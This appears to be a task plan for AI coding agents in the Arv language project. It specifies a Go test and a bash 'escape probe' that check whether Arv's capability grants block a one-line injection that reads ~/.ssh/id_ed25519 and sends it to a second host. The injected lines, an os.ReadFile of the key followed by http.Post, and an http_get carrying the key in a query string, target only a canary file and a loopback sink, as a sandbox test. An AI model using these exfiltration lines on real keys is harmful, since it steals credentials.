# Phase 5, task p5.10: the escape probe

> **For agentic workers:** this file is one task, p5.10. Do it test first, exactly as written; if something here does not match the code you find, stop and report instead of improvising. Prerequisite: tasks p5.1 to p5.9 are committed in your tree. Start every shell command with `cd <your worktree> &&` and use absolute paths: the shell's working directory does not persist. Before committing: `gofmt -l .` prints nothing, `go vet ./...` is clean and `go test -race ./...` is green, and `make bench-test` is green. End the commit message with a blank line and then `Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>`. Never use `--no-verify` and never push; keep Go files under 15 KB and markdown under 18 KB. `go.mod` says `go 1.24.0` (toolchain 1.26.2): `t.Chdir`, `min` and `max` are available; do not use `testing/synctest` or `sync.WaitGroup.Go`. Before a long test run, check `df -h /System/Volumes/Data`; below 1 GB free, stop and report (only `go clean -cache` may be deleted). This machine is heavily loaded: keep wall-clock bounds generous.
>
> Every code block below was applied, in task order, to a scratch copy of `feat/phases-3-8` (Phases 3 and 4 merged) and passed `gofmt -l .`, `go vet ./...` and `go test -race ./...` (including `e2e/`), and `bench/uptime-go`'s own `go vet` and `go test -race`. Design: `12-phase5-gate.md`. Deviations from it, and why: `p5-plan-1.md`. **Do not measure or write the gate verdict**: a separate step does that.

### Task p5.10: `bench/escape/probe.sh`

The security probe. Each version gets a one-line change that tries to read `~/.ssh/id_ed25519` and send it to a host that is not in the target list, and then runs exactly as `run.sh` runs it. The Arv version keeps the same `--allow` flags.
- **The key is a canary.** `HOME` is a temp dir whose `.ssh/id_ed25519` holds a canary string; the real `~/.ssh` is never read.
- **The other host** is a second farm on another loopback port; its `/stats` counts requests to `/sink` and their bytes.
- **Arv probes** (the line goes after `let urls =`, in the root task, which holds the most authority):
  - `arv-read-and-send`: `http_get("SINK/sink?key=" + read_file("HOME/.ssh/id_ed25519"));`. Arv has no POST, so the key would go in the query string, and `~` is spelled out because Arv does not expand it.
  - `arv-send-only`: `http_get("SINK/sink?key=stolen");`, to show the network is closed even without the read.
- **The Go probe** (after `urls := strings.Fields`): `os.ReadFile(os.Getenv("HOME") + "/.ssh/id_ed25519")`, then `http.Post` to the sink. It uses only packages `main.go` already imports. The module is copied with its `replace` made absolute, so it builds outside the repo.

`probe.sh` writes each probe's source, stdout and stderr, and a `summary.txt` with one line per probe: exit code, whether stderr says `capability denied`, and the sink's request and byte counts.

Two tests:
- `TestArvProbesAreDenied` runs both Arv probes in process with the gate's grants. It checks kind `capability`, a `capability denied: ` message that does not carry the key, and nothing at the sink. It pins existing behaviour (I1, I2), so it passes before `probe.sh` exists.
- `TestProbeScript` runs `probe.sh` end to end and checks each probe file is its source plus exactly one line. It skips under `-short`.

**Files:**
- Create: `bench/escape/probe.sh` (executable)
- Create (test): `bench/escape/escape_test.go`
- Modify: `Makefile`

- [ ] **Step 1: Write the failing test**

Create `bench/escape/escape_test.go`:

```go
// Package escape holds the Phase 5 gate's security probe (probe.sh) and
// its tests.
package escape

import (
	"errors"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/delavalom/arvlang/arv"
	"github.com/delavalom/arvlang/arv/runtime"
	"github.com/delavalom/arvlang/bench/farm"
)

// insertAfter is src with line added after the first line that starts,
// leading white space aside, with prefix, as probe.sh's insert does.
func insertAfter(t *testing.T, src, prefix, line string) string {
	t.Helper()
	lines := strings.SplitAfter(src, "\n")
	for i, l := range lines {
		if strings.HasPrefix(strings.TrimLeft(l, " \t"), prefix) {
			return strings.Join(lines[:i+1], "") + line + "\n" + strings.Join(lines[i+1:], "")
		}
	}
	t.Fatalf("no line starts with %q", prefix)
	return ""
}

// The Arv probe, run in process with exactly the gate's grants: the read
// of the key and the send to a host outside the list are both refused
// with capability denied, nothing reaches the sink, and the error does
// not carry the key.
func TestArvProbesAreDenied(t *testing.T) {
	src, err := os.ReadFile("../../examples/uptime.arv")
	if err != nil {
		t.Fatal(err)
	}
	newFarm := func(c farm.Config) (*farm.Farm, *httptest.Server) {
		f, err := farm.New(c)
		if err != nil {
			t.Fatal(err)
		}
		srv := httptest.NewServer(f)
		t.Cleanup(srv.Close)
		return f, srv
	}
	targets, tsrv := newFarm(farm.Config{N: 20, MaxLatency: time.Millisecond, Seed: 1})
	sink, ssrv := newFarm(farm.Config{N: 1})
	dir := t.TempDir()
	key := filepath.Join(dir, "home", ".ssh", "id_ed25519")
	os.MkdirAll(filepath.Dir(key), 0o700)
	const canary = "ARV-ESCAPE-CANARY-in-process"
	os.WriteFile(key, []byte(canary), 0o600)
	os.WriteFile(filepath.Join(dir, "targets.txt"), []byte(targets.TargetList(tsrv.URL)), 0o644)
	os.Mkdir(filepath.Join(dir, "out"), 0o755)
	t.Chdir(dir)
	var caps []runtime.Capability
	for _, g := range []string{"fs_read=targets.txt", "fs_write=out", "net=" + strings.TrimPrefix(tsrv.URL, "http://")} {
		grant, err := runtime.Parse(g, dir)
		if err != nil {
			t.Fatal(err)
		}
		caps = append(caps, grant)
	}
	for name, line := range map[string]string{
		"read and send": `http_get("` + ssrv.URL + `/sink?key=" + read_file("` + key + `"));`,
		"send only":     `http_get("` + ssrv.URL + `/sink?key=stolen");`,
	} {
		probe := insertAfter(t, string(src), "let urls =", line)
		_, err := arv.Run(probe, arv.Options{Caps: caps})
		var ae *arv.Error
		if !errors.As(err, &ae) || ae.Kind != "capability" || !strings.HasPrefix(ae.Msg, "capability denied: ") {
			t.Errorf("%s: %v, want a capability denial", name, err)
		}
		if err != nil && strings.Contains(err.Error(), canary) {
			t.Errorf("%s: the error carries the key: %v", name, err)
		}
		if s := sink.Stats(); s.Sink != 0 || s.Total != 0 {
			t.Errorf("%s: the sink saw %+v", name, s)
		}
	}
}

// probe.sh, end to end: each probe is its program plus one line; the Arv
// probes are denied and send nothing; the Go probe sends the canary.
func TestProbeScript(t *testing.T) {
	if testing.Short() {
		t.Skip("builds the binaries")
	}
	out := t.TempDir()
	cmd := exec.Command("bash", "probe.sh")
	cmd.Env = append(os.Environ(), "BENCH_OUT="+out)
	if b, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("probe.sh: %v\n%s", err, b)
	}
	summary, err := os.ReadFile(filepath.Join(out, "escape", "summary.txt"))
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"arv-read-and-send: exit 1, capability denied: yes, sink requests: 0, sink bytes: 0",
		"arv-send-only: exit 1, capability denied: yes, sink requests: 0, sink bytes: 0",
		"go-read-and-send: exit 1, capability denied: no, sink requests: 1,",
	} {
		if !strings.Contains(string(summary), want) {
			t.Errorf("summary lacks %q:\n%s", want, summary)
		}
	}
	for probe, orig := range map[string]string{
		"arv-read-and-send.arv": "../../examples/uptime.arv",
		"arv-send-only.arv":     "../../examples/uptime.arv",
		"go/main.go":            "../uptime-go/main.go",
	} {
		a, _ := os.ReadFile(orig)
		b, _ := os.ReadFile(filepath.Join(out, "escape", probe))
		if n := oneLineAdded(string(a), string(b)); n < 0 {
			t.Errorf("%s is not %s plus one line", probe, orig)
		}
	}
}

// oneLineAdded is the index of the one line b adds to a, or -1 if b is
// not a with exactly one line added.
func oneLineAdded(a, b string) int {
	x, y := strings.Split(a, "\n"), strings.Split(b, "\n")
	if len(y) != len(x)+1 {
		return -1
	}
	for i := range y {
		if strings.Join(append(append([]string{}, y[:i]...), y[i+1:]...), "\n") == a {
			return i
		}
	}
	return -1
}
```

- [ ] **Step 2: Run it to verify it fails**

Run: `go test -v ./bench/escape/`
Expected: `TestArvProbesAreDenied` PASSES (existing behaviour); `TestProbeScript` FAILS with `probe.sh: exit status 127` and `bash: probe.sh: No such file or directory`.

- [ ] **Step 3: Implement**

Create `bench/escape/probe.sh` and make it executable (`chmod +x bench/escape/probe.sh`):

```bash
#!/usr/bin/env bash
# Phase 5 gate security probe. Each uptime checker gets a one-line change
# that tries to read ~/.ssh/id_ed25519 and send it to a host that is not
# in the target list; both then run exactly as bench/run.sh runs them
# (the Arv version with the same --allow flags). HOME is a temp dir whose
# .ssh/id_ed25519 holds a canary: the real key is never read. The "other
# host" is a second farm on another loopback port; its /sink counts what
# arrives.
#
#   bench/escape/probe.sh            # results in bench/out/escape/
#
# Arv has no POST, so its probe sends the key in a GET query string.
set -euo pipefail

REPO=$(cd "$(dirname "$0")/../.." && pwd)
OUT=${BENCH_OUT:-$REPO/bench/out}
mkdir -p "$OUT"
OUT=$(cd "$OUT" && pwd)
BIN=$OUT/bin
E=$OUT/escape
rm -rf "$E"
mkdir -p "$BIN" "$E/home/.ssh" "$E/work/out" "$E/go"

(cd "$REPO" && go build -o "$BIN/arv" . && go build -o "$BIN/farm" ./bench/farm/cmd/farm)

CANARY="ARV-ESCAPE-CANARY-$$-$RANDOM"
printf '%s' "$CANARY" >"$E/home/.ssh/id_ed25519"
chmod 600 "$E/home/.ssh/id_ed25519"
KEY=$E/home/.ssh/id_ed25519

PIDS=()
trap 'kill "${PIDS[@]}" 2>/dev/null || true' EXIT
# start NAME FLAGS...: a farm whose base URL lands in $E/NAME.url.
start() {
	local name=$1
	shift
	"$BIN/farm" "$@" >"$E/$name.url" 2>"$E/$name.err" &
	PIDS+=($!)
	for _ in $(seq 300); do
		[ -s "$E/$name.url" ] && return
		sleep 0.1
	done
	echo "probe.sh: farm $name did not start" >&2
	exit 1
}
start farm -targets "$E/work/targets.txt" -latency 5ms-40ms
start sink -n 1
FARM=$(head -1 "$E/farm.url")
SINK=$(head -1 "$E/sink.url")

# insert AFTER_PREFIX LINE SRC DST: DST is SRC with LINE added after the
# first line that starts with AFTER_PREFIX (leading spaces ignored).
insert() {
	AFTER=$1 LINE=$2 awk '{ print } !done { s = $0; sub(/^[ \t]+/, "", s); if (index(s, ENVIRON["AFTER"]) == 1) { print ENVIRON["LINE"]; done = 1 } }' "$3" >"$4"
	[ "$(wc -l <"$4")" -eq $(($(wc -l <"$3") + 1)) ] || { echo "probe.sh: '$1' not found in $3" >&2; exit 1; }
}

# The Arv probes, in the root task, which holds the most authority.
insert "let urls =" "http_get(\"$SINK/sink?key=\" + read_file(\"$KEY\"));" "$REPO/examples/uptime.arv" "$E/arv-read-and-send.arv"
insert "let urls =" "http_get(\"$SINK/sink?key=stolen\");" "$REPO/examples/uptime.arv" "$E/arv-send-only.arv"
# The Go probe: the same module, with one line added and the replace
# path made absolute so it builds outside the repo.
cp "$REPO/bench/uptime-go/go.mod" "$REPO/bench/uptime-go/go.sum" "$E/go/"
(cd "$E/go" && go mod edit -replace "github.com/delavalom/arvlang=$REPO")
insert "urls := strings.Fields" "	if key, err := os.ReadFile(os.Getenv(\"HOME\") + \"/.ssh/id_ed25519\"); err == nil { http.Post(\"$SINK/sink\", \"text/plain\", strings.NewReader(string(key))) }" "$REPO/bench/uptime-go/main.go" "$E/go/main.go"
(cd "$E/go" && go build -o "$BIN/uptime-go-escape" .)

# probe NAME CMD...: run with HOME pointing at the canary, then report.
probe() {
	local name=$1
	shift
	curl -fsS -X POST "$FARM/reset" >/dev/null
	curl -fsS -X POST "$SINK/reset" >/dev/null
	local code=0
	(cd "$E/work" && HOME="$E/home" "$@" >"$E/$name.stdout" 2>"$E/$name.stderr") || code=$?
	local stats sink bytes denied=no
	stats=$(curl -fsS "$SINK/stats")
	sink=$(echo "$stats" | sed -E 's/.*"sink":([0-9]+).*/\1/')
	bytes=$(echo "$stats" | sed -E 's/.*"sink_bytes":([0-9]+).*/\1/')
	grep -q "capability denied" "$E/$name.stderr" && denied=yes
	echo "$name: exit $code, capability denied: $denied, sink requests: $sink, sink bytes: $bytes" | tee -a "$E/summary.txt"
	sed 's/^/  stderr: /' "$E/$name.stderr" | head -3 | tee -a "$E/summary.txt"
}
ALLOW=(--allow fs_read=targets.txt --allow fs_write=out --allow "net=${FARM#http://}")
probe arv-read-and-send "$BIN/arv" run "${ALLOW[@]}" "$E/arv-read-and-send.arv"
probe arv-send-only "$BIN/arv" run "${ALLOW[@]}" "$E/arv-send-only.arv"
probe go-read-and-send "$BIN/uptime-go-escape"
echo "canary: ${#CANARY} bytes; results: $E/summary.txt"
```

In `Makefile`, replace `.PHONY: build test e2e bench-test bench` with `.PHONY: build test e2e bench-test bench escape`, and append:

```make

# Phase 5 gate escape probe; output goes to bench/out/escape/.
escape:
	bench/escape/probe.sh
```

- [ ] **Step 4: Run to verify it passes**

Run: `bash -n bench/escape/probe.sh`, `go test -race -v ./bench/escape/`, then `gofmt -l .`, `go vet ./...` and `go test -race ./...`.
Expected: PASS everywhere. In the scratch run the summary read: both Arv probes `exit 1, capability denied: yes, sink requests: 0, sink bytes: 0`; Go `exit 1, capability denied: no, sink requests: 1, sink bytes: 29` (the canary's length varies). Recording the results for the gate is the measuring step's job, not this task's.

- [ ] **Step 5: Commit**

```bash
git add bench/escape/probe.sh bench/escape/escape_test.go Makefile
git commit -m "feat(bench): escape probe

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```
